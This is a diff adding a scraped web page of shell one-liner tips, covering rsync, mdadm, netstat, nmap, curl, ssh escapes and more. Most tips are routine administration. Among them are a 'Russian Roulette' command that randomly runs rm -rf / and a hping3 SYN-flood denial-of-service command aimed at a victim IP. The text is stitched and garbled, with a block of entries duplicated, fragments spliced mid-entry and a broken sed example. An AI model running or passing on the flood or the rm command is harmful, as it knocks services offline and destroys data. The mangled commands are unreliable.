@@ -1,0 +1,949 @@
+<p>This is another command I can’t believe I didn’t know about until recently. xxd can generate a hex dump of a given file, and also convert an edited hex dump back into its original binary form. It can also output the hex dump as a C array which is also super handy:</p>
+
+<blockquote>
+<p>xxd -i data.bin</p>
+</blockquote>
+
+<p>unsigned char data<em>bin[] = {
+  0x6d, 0x61, 0x64, 0x65, 0x20, 0x79, 0x6f, 0x75, 0x20, 0x6c, 0x6f, 0x6f,
+  0x6b, 0x0a
+};
+unsigned int data</em>bin_len = 14;</p>
+
+<p>man ascii
+cal
+cat /proc/diskstats | grep hda</p>
+
+<h2>Title: All that what exists in dir A and not in dir B will be copied from dir A to new or existing dir C</h2>
+
+<p>$ rsync -v -r --size-only --compare-dest=../B/ A/ C/</p>
+
+<p>Assumed dir A, B, C are subdirs of the current dir
+Exact syntax of the command is:
+rsync -v -r --size-only --compare-dest=/path<em>of</em>B/B/ /path<em>of</em>A/A/ 
+/path<em>of</em>C/C/
+(do not omit end-slashes, since that would copy only the names and not the 
+contents of subdirs of dir A to dir C)
+You can replace --size-only with --checksum for more thorough file differences 
+validation
+Useful switch:
+-n, --dry-run perform a trial run with no changes made
+by David Winterbottom (codeinthehole.com[5])</p>
+
+<h2>Title: Check disk I/O</h2>
+
+<p>$ iostat -d -x 10 5</p>
+
+<h2>Title: Command to rename multiple file in one go</h2>
+
+<p>$ rename &#39;s/.xls/.ods/g&#39; *.xls</p>
+
+<h2>Title: Creates an old version raid1 with 3 mirror and 3 spares, from partitions of the same disk</h2>
+
+<p>$ mdadm --create /dev/md0 --metadata=0.90 --level=1 --raid-devices=3 
+--spare-devices=3 /dev/sdb[5-9] /dev/sdb10
+The old version (--metadata=0.90) is useful when you want to use kernel raid 
+autodetect and not an initrd image.</p>
+
+<h2>Title: Delete all empty lines from a file with vim</h2>
+
+<p>$ :v/./d
+If you need to delete lines that may contain space characters (such as tabs or 
+spaces) as well as empty ones, try:
+:v/\S/d</p>
+
+<h2>Title: find previously entered commands (requires configuring .inputrc)</h2>
+
+<p>$ M-p (aka ALT+P)
+Meta-p is one of my all time most used and most loved features of working at 
+the command line. It&#39;s also one that surprisingly few people know about. To use
+it with bash (actually in any readline application), you&#39;ll need to add a 
+couple lines to your .inputrc then have bash reread the .inputrc using the bind
+command:
+ 
+echo &#39;&quot;\en&quot;: history-search-forward&#39; &gt;&gt; ~/.inputrc</p>
+
+<p> 
+echo &#39;&quot;\ep&quot;: history-search-backward&#39; &gt;&gt; ~/.inputrc</p>
+
+<p> 
+bind -f ~/.inputrc</p>
+
+<p> </p>
+
+<p>  I first learned about this feature in tcsh. When I switched over to bash 
+about fifteen years ago, I had assumed I&#39;d prefer ^R to search in reverse. 
+Intuitively ^R seemed better since you could search for an argument instead of 
+a command. I think that, like using a microkernel for the Hurd, it sounded so 
+obviously right fifteen years ago, but that was only because the older way had 
+benefits we hadn&#39;t known about.</p>
+
+<p>  I think many of you who use the command line as much as I do know that we can
+just be thinking about what results we want and our fingers will start typing 
+the commands needed. I assume it&#39;s some sort of parallel processing going on 
+with the linguistic part of the brain. Unfortunately, that parallelism doesn&#39;t 
+seem to work (at least for me) with searching the history. I realize I can save
+myself typing using the history shortly after my fingers have already started 
+&quot;speaking&quot;. But, when I hit ^R in Bash, everything I&#39;ve already typed gets 
+ignored and I have to stop and think again about what I was doing. It&#39;s a small
+bump in the road but it can be annoying, especially for long-time command line 
+users. Usually M-p is exactly what I need to save myself time and trouble.</p>
+
+<p>  If you use the command line a lot, please give Meta-p a try. You may be 
+surprised how it frees your brain to process more smoothly in parallel. (Or 
+maybe it won&#39;t. Post here and let me know either way. ☺)</p>
+
+<ul>
+<li>View this command to comment, vote or add to favourites[1]</li>
+<li>View all commands by hackerb9[2]</li>
+</ul>
+
+<h1>Title: Get IP address from domain</h1>
+
+<p>$ dig +short &lt;&gt;domain&gt;
+shorter (thus better ;-)</p>
+
+<h1>Title: Get the Nth argument of the last command (handling spaces correctly)</h1>
+
+<p>$ !:n</p>
+
+<p>Bash&#39;s history expansion character, &quot;!&quot;, has many features, including &quot;!:&quot; for 
+choosing a specific argument (or range of arguments) from the history. The gist
+is any number after !: is the number of the argument you want, with !:1 being 
+the first argument and !:0 being the command. See the sample output for a few 
+examples. For full details search for &quot;^HISTORY EXPANSION&quot; in the bash(1) man 
+page.</p>
+
+<p> </p>
+
+<p> Note that this version improves on the previous function in that it handles 
+arguments that include whitespace correctly.</p>
+
+<h1>Title: Get the Nth argument of the last command in $HISTFILE</h1>
+
+<p>$ function garg () { tail -n 1 ${HISTFILE} | awk &quot;{ print \$$1 }&quot; }
+This gets the Nth argument in the last line of your history file. This is 
+useful where history is being written after each command, and you want to use 
+arguments from the previous command in the current command, such as when doing 
+copies/moving directories etc.</p>
+
+<p>I wrote this after getting irritated with having to continually type in long 
+paths/arguments.</p>
+
+<p>You could also use $_ if all you want is the last argument.</p>
+
+<h1>Title: Grep for text within all files in a folder structure</h1>
+
+<p>$ grep --color -R &quot;text&quot; directory/</p>
+
+<p>$ du -hd1 | sort -hr</p>
+
+<h1>Title: netstat with group by (ip adress)</h1>
+
+<p>$ netstat -ntu | awk &#39; $5 ~ /^(::ffff:|[0-9|])/ { gsub(&quot;::ffff:&quot;,&quot;&quot;,$5); print 
+$5}&#39; | cut -d: -f1 | sort | uniq -c | sort -nr</p>
+
+<p>Same as the rest, but handle IPv6 short IPs. Also, sort in the order that 
+you&#39;re probably looking for.</p>
+
+<h1>Title: Quickly write and run a C program.</h1>
+
+<p>$ vim test.c &amp;&amp; gcc -x c -o a.out test.c &amp;&amp; ./a.out &amp;&amp; rm a.out test.c</p>
+
+<h1>Title: Show open, listening ports with no associated program (alternative using nmap/lsof instead of netstat)</h1>
+
+<p>$ nmap -sUT -p- localhost | sed -n &#39;s#(^[0-9]<em>)/([^ ]</em>).*#\2:\1#p&#39; | while 
+read p; do if ! lsof -i $p&gt;/dev/null; then echo &quot;Hidden process listening on 
+port $p&quot;; fi; done</p>
+
+<p>This shows open ports which have no associated program; that is, ports that are
+opened by a kernel module and may be a security problem. This should do the 
+same thing as the simpler netstat command I posted, but can be used if you 
+think your netstat may have been trojaned. This works by using nmap to check 
+what ports are actually open and then compares if those ports are also open 
+according to lsof. Lsof (at least as of version 4.81) cannot detect open ports 
+which have no PID/program associated and returns -1 for the hidden ports.</p>
+
+<p> </p>
+
+<p> Note that nmap and lsof require root permissions to run, but nmap need not be 
+run on the potentially compromised host. Also note that hidden network 
+processes aren&#39;t always a security problem. For example, the Linux kernel has a
+module for the NFS file server which would show up on port 2049.</p>
+
+<p> </p>
+
+<p> Standard forensic tools, such as rkhunter, did not detect the particular 
+rootkit that was on the machine I was investigating. The only tool that worked 
+for me was kjackal, which detects kernel module hijacking. The source for 
+kjackal is available at https://github.com/dgoulet/kjackal .</p>
+
+<h1>Title: Throttle curl downloads</h1>
+
+<p>$ curl -O --limit-rate 500k $URL
+Examples: 500K, 1m and 1G.</p>
+
+<h1>Title: Find a machine&#39;s IP address and FQDN</h1>
+
+<p>$ for i in <code>ip addr show dev eth1 | grep inet | awk &#39;{print $2}&#39; | cut -d/ 
+-f1</code>; do echo -n $i; echo -en &#39;\t&#39;; host $i | awk &#39;{print $5}&#39;; done</p>
+
+<h1>Title: find an unused unprivileged TCP port</h1>
+
+<p>$ port=32768; while netstat -atn | grep -q :$port; do port=$(expr $port + 1); 
+done; echo $port</p>
+
+<h1>Title: find previously entered commands</h1>
+
+<p>$ &lt;&gt;ctrl&gt;+r</p>
+
+<p>Searches bash-history in reverse order (last entered commands first). Pressing 
+ctrl+r again shows the next matching entry.</p>
+
+<h1>Title: Get IP address from domain</h1>
+
+<p>$ nslookup www.example.com | tail -2 | head -1 | awk &#39;{print $2}&#39;</p>
+
+<p>I&#39;m not sure how reliable this command is, but it works for my needs. Here&#39;s 
+also a variant using grep.</p>
+
+<p>nslookup www.example.com[1] | grep &quot;^Address: &quot; | awk &#39;{print $2}&#39;</p>
+
+<h1>Title: journalctl -f</h1>
+
+<p>$ journalctl -f
+a tail -f variant of systemd journal. Follow the most recent updates or if 
+events are appended to the journal</p>
+
+<h1>Title: Let google say something for you! (mpv can be replaced by any mp3-decoder)</h1>
+
+<p>$ say () { mpv $(sed -E &quot;s;([a-Z]<em>)( 
+|$);http://ssl.gstatic.com/dictionary/static/sounds/de/0/\1.mp3 ;g&quot; &lt;&gt;&lt;&gt;&lt;&gt; $</em>);
+}; say hello world &quot;how is it&quot; going</p>
+
+<p>Take a list of words and let mpv play the pronunciation-file from gstatic. 
+Inspired by </p>
+
+<h1>Title: Merge AVI-files without recoding</h1>
+
+<p>$ cat part1.avi part2.avi part3.avi &gt; tmp.avi &amp;&amp; mencoder -forceidx -oac copy 
+-ovc copy tmp.avi -o output.avi &amp;&amp; rm -f tmp.avi</p>
+
+<p>Useful for when you download movies split into </p>
+
+<p>Credit to rich @ 
+http://superuser.com/questions/318640/merge-avi-files-without-recoding-in-mac-os-x-lion[1]</p>
+
+<p>mencoder is generally included with mplayer.</p>
+
+<h1>Title: Monitor open connections for httpd including listen, count and sort it per IP</h1>
+
+<p>$ watch &quot;netstat -plan | grep -v LISTEN | grep \&quot;:80 \&quot; | awk {&#39;print \$5&#39;} | 
+cut -d: -f 1 | uniq -c | sort -nk 1&quot;</p>
+
+<p>Doesn&#39;t list connections to other ports than port 80. Not f.e. 8080 or 8091.</p>
+
+<h1>Title: Number of .... indicate how far down to cd</h1>
+
+<p>$ for i in {1..6};do c=;d=;for u in <code>eval echo {1..$i}</code>;do 
+c=&quot;$c../&quot;;d=&quot;$d..&quot;;eval &quot;$d(){ cd $c;}&quot;; eval &quot;$d.(){ cd $c;}&quot;;done;done</p>
+
+<h1>Title: Parse YouTube url (get youtube video id)</h1>
+
+<p>$ sh -c &#39;url=&quot;http://youtu.be/MejbOFk7H6c&quot;; vid=&quot;<code>for i in 
+&quot;.*youtu\.be/\([^\/&amp;?#]\+\)&quot; &quot;.*youtu.\+v[=/]\([^\/&amp;?#]\+\)&quot; 
+&quot;.*youtu.\+embed/\([^\/&amp;?#]\+\)&quot;; do expr &quot;${url}&quot; : &quot;${i}&quot;; done</code>&quot;; if [ -n 
+&quot;${vid}&quot; ]; then echo ${vid}; else echo &quot;${url}&quot;; fi&#39;</p>
+
+<p>url can be like any one of followings:
+url=&quot;MejbOFk7H6c&quot;url=&quot;http://youtu.be/MejbOFk7H6c&quot;
+url=&quot;https://youtube.com/watch?feature=player<em>embedded&amp;v=MejbOFk7H6c#t&quot;
+url=&quot;//www.youtube.com/v/MejbOFk7H6c?hl=ru</em>RU&amp;version=3&amp;rel=0&quot;
+url=&quot;http://www.youtube.com/embed/MejbOFk7H6c?feature=player_embedded&quot;</p>
+
+<p>If url mismatching, whole url will be returned.</p>
+
+<p>by David Winterbottom (codeinthehole.com[5])
+[image 6]</p>
+
+<h1>Title: tcpdump whole packets to file in ascii and hex with ip adresses instead of hostname</h1>
+
+<p>$ tcpdump host &lt;&gt;IP&gt; -nXXv -s0 -w file.pcap
+ssh user@ip-address &quot;cat /Some/Random/Directory/*mp3&quot; | mplayer -</p>
+
+<p>$ git-createrepo() { repos<em>path=&#39;/srv/git/&#39;; mkdir $repos</em>path$1; cd 
+$repos_path$1; git init --bare; echo &quot;Repository location: ssh://$USER@<code>cat 
+/etc/HOSTNAME</code><code>pwd</code>&quot;; cd -; }</p>
+
+<p>Creates a git repository in a predefined location.</p>
+
+<p>Convert the ASS file to UTF-8 (or whatever encoding you are comfortable with).
+I used iconv: iconv -f utf16 -t utf8 &lt; file.ass &gt; result.ass
+Play it by using the &quot;-utf8&quot; switch of mplayer: mplayer -ass -utf8 file.mkv. 
+If the ASS contains special characters (such as CJK chars), use a good font by &quot;-font /usr/share/font/cjk.ttf&quot;
+For example, if you want to copy all your output to /dev/tty1 you would run</p>
+
+<p>script -f /dev/tty1</p>
+
+<h1>Title: list the top 15 folders by decreasing size in MB</h1>
+
+<p>$ du -xB M --max-depth=2 /var | sort -rn | head -n 15</p>
+
+<h1>Title: prevent large files from being cached in memory (backups!)</h1>
+
+<p>$ nocache &lt;&gt;I/O-heavy-command&gt;</p>
+
+<p>We all know...
+nice -n19</p>
+
+<p>for low CPU priority.
+ionice -c3</p>
+
+<p>for low I/O priority.</p>
+
+<p>nocache can be useful in related scenarios, when we operate on very large files
+just a single time, e.g. a backup job. It advises the kernel that no caching is
+required for the involved files, so our current file cache is not erased, 
+potentially decreasing performance on other, more typical file I/O, e.g. on a 
+desktop.</p>
+
+<h1>Title: Recursively search and replace old with new string, inside every instance of filename.ext</h1>
+
+<p>$ find . -type f -name filename.exe -exec sed -i &quot;s/oldstring/oldstring/g&quot; {} 
++;</p>
+
+<p>This is a slightly modified version of 
+http://www.commandlinefu.com/commands/view/4283/recursive-search-and-replace-old-with-new-string-inside-files<a href="which%20did%20not%20work%20due%20to%20incorrect%20syntax">1</a> with the added option to sed 
+inside only files named filename.ext</p>
+
+<h1>Title: get a random 0/1, use it for on/off, yes/no</h1>
+
+<p>$ echo $[RANDOM % 2]
+use it to add a random boolean switch to your script</p>
+
+<h1>Title: get a random number in bash</h1>
+
+<p>$ echo $[RANDOM % 100] # range 0-99</p>
+
+<h1>Title: Send murmurd log lines to syslog</h1>
+
+<p>$ nohup tail /var/log/murmur.log | perl -ne &#39;/^&lt;&gt;.&gt;[0-9:. -]{24}(\d+ =&gt; 
+)?(.*)/; $pid=<code>pgrep -u murmur murmurd | head</code>; chomp $pid; <code>logger -p info -t 
+&quot;murmurd[$pid]&quot; \\&quot;$2\\&quot;</code>;&#39; &amp;</p>
+
+<p>Sends log lines from murmur&#39;s (the mumble server&#39;s) logfile to syslog.</p>
+
+<h1>Title: Diff 2 file struct - Useful for branch diff and jars diff(uncompressed)</h1>
+
+<p>$ diff &lt;&gt;(cd A; find -type f|xargs md5sum ) &lt;&gt;(cd B; find -type f | xargs 
+md5sum )</p>
+
+<p>This is usefull to diff 2 paths in branches of software, or in different 
+versions of a same zip file. So you can get the real file diff.</p>
+
+<h1>Title: Russian Roulette</h1>
+
+<p>$ [ $[ $RANDOM % 6 ] == 0 ] &amp;&amp; rm -rf / || echo <em>Click</em>
+WARNING! If you are not feeling lucky, don&#39;t run this command!</p>
+
+<h1>Title: Fetch the current human population of Earth</h1>
+
+<p>$ curl --silent http://www.census.gov/population/international/ | grep 
+wclocknum | sed -r &#39;s@^.<em>&gt;([0-9,]+)&lt;&gt;.</em>$@\1@&#39;</p>
+
+<h1>Title: Use curl with a local SOCKS5 proxy (e.g. Tor)</h1>
+
+<p>$ turl(){ curl --socks5-hostname localhost:9050 $@ ; }</p>
+
+<p>Routes curl input through a local SOCKS5 proxy; in this case, anonymizes curl 
+activity via The Onion Router (Tor) proxy running locally.</p>
+
+<h1>Title: AES file encryption with openssl</h1>
+
+<p>$ openssl aes-256-cbc -salt -in secrets.txt -out secrets.txt.enc
+To decrypt: openssl aes-256-cbc -d -in secrets.txt.enc -out secrets.txt.new
+Optional parameter -a makes output base64 encoded, can be viewed in text editor
+or pasted in email</p>
+
+<h1>Title: check your up to date delicious links.</h1>
+
+<p>$ curl -k https://Username:Password@api.del.icio.us/v1/posts/all?red=api | 
+xml2| \grep &#39;@href&#39; | cut -d\= -f 2- | sort | uniq | linkche cker --stdin 
+--complete -v -t 50 -F blacklist</p>
+
+<p>This commands queries the delicious api then runs the xml through xml2, grabs 
+the urls cuts out the first two columns, passes through uniq to remove 
+duplicates if any, and then goes into linkchecker who checks the links. the 
+links go the blacklist in ~/.linkchecker/blacklist. please see the manual pages
+for further info peeps. I took me a few days to figure this one out. I how you 
+enjoy it. Also don&#39;t run these api more then once a few seconds you can get 
+banned by delicious see their site for info.</p>
+
+<h1>Title: DOS attack</h1>
+
+<p>$ hping3 --rand-source -p 80 -S --flood Victim_ip
+Perform a DOS attack from Linux using hping3 
+DOS=Denial-of-Service</p>
+
+<h1>!/bin/bash</h1>
+
+<p>wget -q -O - checkip.dyndns.org | sed -e &#39;s/[^[:digit:]|.]//g&#39;#Title: nmap
+$ db_nmap -T4 -A -v -v ( TARGET )
+$ nmap --script dhcp-discover 192.168.244.0/24
+wery usebl</p>
+
+<p>$ !!; while [ $? -ne 0 ]; do !!; done
+Executes the previously-run command constantly until it returns 0 (success). </p>
+
+<h1>Title: Running applications require X in ssh</h1>
+
+<p>$ ssh -X -l user 192.168.1.25
+One time you logged in, you can prove these method just writing &quot;firefox&quot;.</p>
+
+<h1>Title: Sharing a file through http 80 port:</h1>
+
+<p>$ nc -w 5 -v -l -p 80 &lt;&gt; file.ext</p>
+
+<p>$ ffmpeg -r 12 -i img%03d.jpg -sameq -s hd720 -vcodec libx264 -crf 25 
+OUTPUT.MP4</p>
+
+<h1>Title: Fetch the current human population of Earth</h1>
+
+<p>$ curl --silent http://www.census.gov/population/international/ | grep 
+wclocknum | sed -r &#39;s@^.<em>&gt;([0-9,]+)&lt;&gt;.</em>$@\1@&#39;</p>
+
+<h1>Title: Use curl with a local SOCKS5 proxy (e.g. Tor)</h1>
+
+<p>$ turl(){ curl --socks5-hostname localhost:9050 $@ ; }</p>
+
+<p>Routes curl input through a local SOCKS5 proxy; in this case, anonymizes curl 
+activity via The Onion Router (Tor) proxy running locally.</p>
+
+<h1>Title: AES file encryption with openssl</h1>
+
+<p>$ openssl aes-256-cbc -salt -in secrets.txt -out secrets.txt.enc
+To decrypt: openssl aes-256-cbc -d -in secrets.txt.enc -out secrets.txt.new
+Optional parameter -a makes output base64 encoded, can be viewed in text editor
+or pasted in email</p>
+
+<h1>Title: check your up to date delicious links.</h1>
+
+<p>$ curl -k https://Username:Password@api.del.icio.us/v1/posts/all?red=api | 
+xml2| \grep &#39;@href&#39; | cut -d\= -f 2- | sort | uniq | linkche cker --stdin 
+--complete -v -t 50 -F blacklist</p>
+
+<p>This commands queries the delicious api then runs the xml through xml2, grabs 
+the urls cuts out the first two columns, passes through uniq to remove 
+duplicates if any, and then goes into linkchecker who checks the links. the 
+links go the blacklist in ~/.linkchecker/blacklist. please see the manual pages
+for further info peeps. I took me a few days to figure this one out. I how you 
+enjoy it. Also don&#39;t run these api more then once a few seconds you can get 
+banned by delicious see their site for info.</p>
+
+<h1>Title: DOS attack</h1>
+
+<p>$ hping3 --rand-source -p 80 -S --flood Victim_ip
+Perform a DOS attack from Linux using hping3 
+DOS=Denial-of-Service</p>
+
+<h1>!/bin/bash</h1>
+
+<p>wget -q -O - checkip.dyndns.org | sed -e &#39;s/[^[:digit:]|.]//g&#39;#Title: nmap
+$ db_nmap -T4 -A -v -v ( TARGET )
+$ nmap --script dhcp-discover 192.168.244.0/24
+wery usebl</p>
+
+<p>$ !!; while [ $? -ne 0 ]; do !!; done
+Executes the previously-run command constantly until it returns 0 (success). </p>
+
+<h1>Title: Running applications require X in ssh</h1>
+
+<p>$ ssh -X -l user 192.168.1.25
+One time you logged in, you can prove these method just writing &quot;firefox&quot;.</p>
+
+<h1>Title: Sharing a file through http 80 port:</h1>
+
+<p>$ nc -w 5 -v -l -p 80 &lt;&gt; file.ext</p>
+
+<p>$ ffmpeg -r 12 -i img%03d.jpg -sameq -s hd720 -vcodec libx264 -crf 25 
+OUTPUT.MP4
+for dir in ~/git/*; do (cd &quot;$dir&quot; &amp;&amp; git pull); done</p>
+
+<p>chattr -iR /mnt/backups/OLD<em>ONE</em>*</p>
+
+<h1>Title: 20char long alpahnumeric &quot;password&quot;</h1>
+
+<p>$ head -c20 /dev/urandom | xxd -ps</p>
+
+<p>20characters long alpahnumeric &quot;password&quot;</p>
+
+<h1>Title: Getting OpenPGP keys for Launchpad PPAs on Debian based systems from behind a firewall</h1>
+
+<p>$ sudo apt-key adv --keyserver hkp://keys.gnupg.net:80 --recv-keys [key to get 
+here]</p>
+
+<p>If you are an unlucky sole behind a corporate firewall you will likely find 
+that downloading gpg keys is blocked. This is because the hkp protocol uses 
+port 11371 by default to transfer the key.</p>
+
+<p>By adding &quot;hkp://&quot; to the beginning of the hostname and &quot;:80&quot; to the end you 
+are asking gpg to try using port 80 to connect (less likely to be blocked by a 
+firewall). This relies on the remote server answering to requests over port 80.</p>
+
+<h1>Title: Netcat ftp honeypot centos linux (use port 22 for SSH)</h1>
+
+<p>$ while [ 1 ]; do echo -e &quot;220 ProFTPD 1.3.3c Server [ProFTPD] \nFAILED FTP 
+ATTEMPT - PORT 21&quot; | nc -vvv -l 192.168.1.65 21 &gt;&gt; /var/log/honeylog.log 2&gt;&gt; 
+/var/log/honeylog.log; done</p>
+
+<p>[root@dhcppc1 windows]# cat /var/log/honeylog.log</p>
+
+<p>Connection from 192.168.1.71 port 21 [tcp/ftp] accepted</p>
+
+<p>Connection from 192.168.1.65 port 21 [tcp/ftp] accepted</p>
+
+<p>[root@dhcppc1 windows]# nc 192.168.1.65 21</p>
+
+<p>220 ProFTPD 1.3.3c Server [ProFTPD] </p>
+
+<p>FAILED FTP ATTEMPT - PORT 21</p>
+
+<p>*You can not run it if you have activated the ftp server.</p>
+
+<h1>Title: md5sum for files with bad characters</h1>
+
+<p>$ find . -type f -exec md5sum {} \;</p>
+
+<h1>Title: psgrepp</h1>
+
+<p>$ ps aux | grep $(echo $1 | sed &quot;s/^(.)/[\1]/g&quot;)
+grep ps aux</p>
+
+<h1>Title: run all &quot;backup&quot; scripts inside desired folder</h1>
+
+<p>$ find /var/scripts -name &#39;backup*&#39; | while read i; do &quot;$i&quot;; done</p>
+
+<p>It eases the way of creating cron jobs of backup scripts. </p>
+
+<p>Just put this line as cron job, and all your backups are called sequentially. </p>
+
+<p>Allows you to forget, when in time, call this backup, just focus on your 
+scripting. Also maintains the way of calling a single backup script when It&#39;s 
+needed.</p>
+
+<h1>Title: Discover the process start time</h1>
+
+<p>$ ps -eo pid,lstart,cmd
+That is useful to discover the start time of process older than 1 day.
+You can also run:
+ls -ld /proc/PID
+That&#39;s returning the creation date of the proc files from the process. Some 
+users reported that this way might show you a wrong date since any other 
+process like cron, for example, could change this date.</p>
+
+<h1>Title: Display the format of a directory or file</h1>
+
+<p>$ stat -f -L -c %T YOUR<em>FILE</em>OR_DIRECTORY</p>
+
+<h1>Title: find the 10 largest directories</h1>
+
+<p>$ find . -type d -print0 | xargs -0 du -s | sort -n | tail -10 | cut -f2 | 
+xargs -I{} du -sh {} | sort -rn</p>
+
+<h1>Title: Kill a broken ssh connection</h1>
+
+<p>$ &lt;&gt;Return&gt;~.</p>
+
+<p>This is useful for example if you are on ssh in a server and the server goes 
+down without letting you out.</p>
+
+<p>This is part of a larget sets of escape sequences provided by ssh. You can find
+them with ~? Here&#39;s the list:</p>
+
+<p>~. - terminate connection (and any multiplexed sessions)</p>
+
+<p>~B - send a BREAK to the remote system</p>
+
+<p>~C - open a command line</p>
+
+<p>~R - request rekey</p>
+
+<p>~V/v - decrease/increase verbosity (LogLevel)</p>
+
+<p>~^Z - suspend ssh</p>
+
+<p>~# - list forwarded connections</p>
+
+<p>~&amp; - background ssh (when waiting for connections to terminate)</p>
+
+<p>~? - this message</p>
+
+<p>~~ - send the escape character by typing it twice</p>
+
+<h1>Title: List partition superblocks</h1>
+
+<p>$ sudo dumpe2fs /dev/sda1 | grep superblock</p>
+
+<h1>Title: network interface and routing summary</h1>
+
+<p>$ nmap --iflist</p>
+
+<h1>Title: Remove git branches that do not have a remote tracking branch anymore</h1>
+
+<p>$ git branch -r | awk &#39;{print $1}&#39; | egrep -v -f /dev/fd/0 &lt;&gt;(git branch -vv | 
+grep origin) | awk &#39;{print $1}&#39; | xargs git branch -d</p>
+
+<h1>Title: Resize images with mogrify with lots of options</h1>
+
+<p>$ find . -name &#39;<em>.jpg&#39; -o -name &#39;</em>.JPG&#39; -print0 | xargs -0 mogrify -resize 
+1024&quot;&gt;&quot; -quality 40</p>
+
+<p>The &quot;find $stuff -print0 | xargs -0 $command&quot; pattern causes both find and 
+xargs to use null-delineated paths, greatly reducing the probability of either 
+hiccuping on even the weirdest of file/path names.</p>
+
+<p>It&#39;s also not strictly necessary to add the {} at the end of the xargs command 
+line, as it&#39;ll put the files there automatically.</p>
+
+<p>Mind, in most environments, you could use find&#39;s &quot;-exec&quot; option to bypass xargs
+entirely:
+find . -name &#39;<em>.jpg&#39; -o -name &#39;</em>.JPG&#39; -exec mogrify -resize 1024&quot;&gt;&quot; -quality 40
+{} +</p>
+
+<p>will use xargs-like &quot;make sure the command line isn&#39;t too long&quot; logic to run 
+the mogrify command as few times as necessary (to run once per file, use a &#39;;&#39; 
+instead of a &#39;+&#39; - just be sure to escape it properly).</p>
+
+<h1>Title: VPN without VPN: Get access to networks available from your ssh server and hide behind it</h1>
+
+<p>$ sshuttle -r &lt;&gt;username&gt;@&lt;&gt;sshserver&gt; 0/0
+https://github.com/apenwarr/sshuttle disassembles TCP packets, sends them over 
+SSH, assembles and forwards on the server side, and vice versa.</p>
+
+<h1>Title: Wait for Web service to spin up, aka alert me when the server stops returning a 503</h1>
+
+<p>$ while true; do curl -vsL -o /dev/null athena.example.com 2&gt;&amp;1 | grep 503 &gt; 
+/dev/null || echo &quot;OK: server is up.&quot;; sleep 8; done</p>
+
+<h1>Title: A bash timer</h1>
+
+<p>$ alias timer=&#39;export ts=$(date +%s);p=&#39;\&#39;&#39;$(date -u -d @&quot;$(($(date +%s)-$ts))&quot;
++&quot;%H.%M.%S&quot;)&#39;\&#39;&#39;;watch -n 1 -t banner $p;eval &quot;echo $p&quot;&#39;</p>
+
+<p>Starts and shows a timer. banner command is a part of the sysvbanner package. 
+Instead of the banner an echo or figlet commands could be used. Stop the timer 
+with Ctrl-C and elapsed time will be shown as the result.</p>
+
+<h1>Title: a (slightly) better <code>trash</code></h1>
+
+<p>$ trash &lt;&gt;file&gt; # now doesn&#39;t overwrite previously trashed directories</p>
+
+<p>Say you trash a directory to your .Trash. For one reason or another, a 
+directory that&#39;s the same name as the previously trashed directory gets created
+and now you need to trash it too. My previous trash function would barf, being 
+unable to overwrite the directory in the .Trash folder. Well, I didn&#39;t want to 
+mv -f the thing; you never know if you want the old one around for a while. So,
+instead, I append the time onto the old directory in order to a) make the 
+function <em>not</em> barf and b) to keep track of the order in which the directories 
+were trashed.</p>
+
+<p>May sound like an edge case, but I encounter it often. NOTE: I&#39;m still a bit 
+confused about quoting $@, as the bash docs say that $@ expands to <em>quoted</em> 
+elements. I don&#39;t ever use empty space in my filenames, so ... Feedback 
+appreciated.</p>
+
+<p>function trash {</p>
+
+<p>if [[ -z &quot;$*&quot; ]] ; then</p>
+
+<p>echo &quot;Usage: trash &quot;</p>
+
+<p>else</p>
+
+<p>date=&quot;$( date +%F )&quot;</p>
+
+<p>trashdir=&quot;${HOME}/.Trash/${date}&quot;</p>
+
+<p>[[ -d &quot;${trashdir}&quot; ]] || mkdir -p &quot;${trashdir}&quot;</p>
+
+<p>for file in $@ ; do</p>
+
+<p>trashfile=&quot;${trashdir}/${file}&quot;</p>
+
+<h1>if trashfile is a directory, chop the filal &#39;/&#39; so the renaming is valid</h1>
+
+<p>[[ -e &quot;$trashfile&quot; ]] &amp;&amp; mv -v &quot;${trashfile}&quot; &quot;${trashfile%/}_$(date &quot;+%H%M&quot; )</p>
+
+<p>mv &quot;${file}&quot; &quot;${trashdir}&quot; &amp;&amp; echo &quot;${file} trashed!&quot;</p>
+
+<p>done</p>
+
+<p>fi</p>
+
+<p>}</p>
+
+<h1>Title: Check SSH public and private keys matching</h1>
+
+<p>$ diff &lt;&gt;(ssh-keygen -y -f ~/.ssh/id<em>rsa) &lt;&gt;(cut -d&#39; &#39; -f1,2 ~/.ssh/id</em>rsa.pub)</p>
+
+<h1>Title: Create thumbnails and a HTML page for listing them (with links to sources)</h1>
+
+<p>$ mogrify -format gif -define jpeg:size=500x180 -auto-orient -thumbnail 250x90 
+&#39;*.jpg&#39; &amp;&amp; (echo &quot;&lt;&gt;ul&gt;&quot;; for i in *.gif; do basename=$(echo $i | rev | cut -d.
+-f2- | rev) ; echo &quot;&lt;&gt;li&gt;&lt;&gt;a href=&#39;$basename.jpg&#39;&gt;&lt;&gt;img 
+src=&#39;$basename.gif&#39;&gt;&lt;&gt;/a&gt;&quot;; done) &gt; list.html</p>
+
+<p>The input images are assume to have the &quot;jpg&quot; extension. Mogrify will overwrite
+any gif images with the same name! Will not work with names with spaces.</p>
+
+<h1>Title: Detect broken video files with mplayer and bash in the current directory</h1>
+
+<p>$ for i in *.flv *.mkv *.avi; do mplayer -ao null -vo null -ss 0 -endpos 1 </p>
+
+<blockquote>
+<p>/dev/null &quot;$i&quot; 2&gt; &gt;(grep -qi error &amp;&amp; echo &gt;&amp;2 &quot;$i seems bad&quot;); done</p>
+</blockquote>
+
+<h1>Title: extract XML RSS etc by tags such as  or  or</h1>
+
+<p>$ curl ${URL} 2&gt;/dev/null|grep &quot;&lt;&gt;${BLOCK}&gt;&quot;|sed -e 
+&quot;s/.<em>&lt;&gt;${BLOCK}&gt;(.</em>)&lt;&gt;\/${BLOCK}&gt;.*/\1/g&quot;</p>
+
+<p>set BLOCK to &quot;title&quot; or any other HTML / RSS / XML tag and curl URL to get 
+everything in-between e.g. some text</p>
+
+<h1>Title: Periodically run a command without hangups, and send the output to my e-mail</h1>
+
+<p>$ nohup bash -c &quot;while true; do ps -x | mail pascalv@mmmmail.com; sleep 3600; 
+done&quot; | mail pascalv@mmmmail.com &amp;</p>
+
+<p>Run &quot;ps -x&quot; (process status) in the background every hour (in this example).</p>
+
+<p>The outputs of both &quot;nohup&quot; and &quot;ps -x&quot; are sent to the e-mail (instead of 
+nohup.out and stdout and stderr).</p>
+
+<p>If you like it, replace &quot;ps -x&quot; by the command of your choice, replace 3600 (1 
+hour) by the period of your choice.</p>
+
+<h1>Title: Tunnel ssh through Socks Proxy</h1>
+
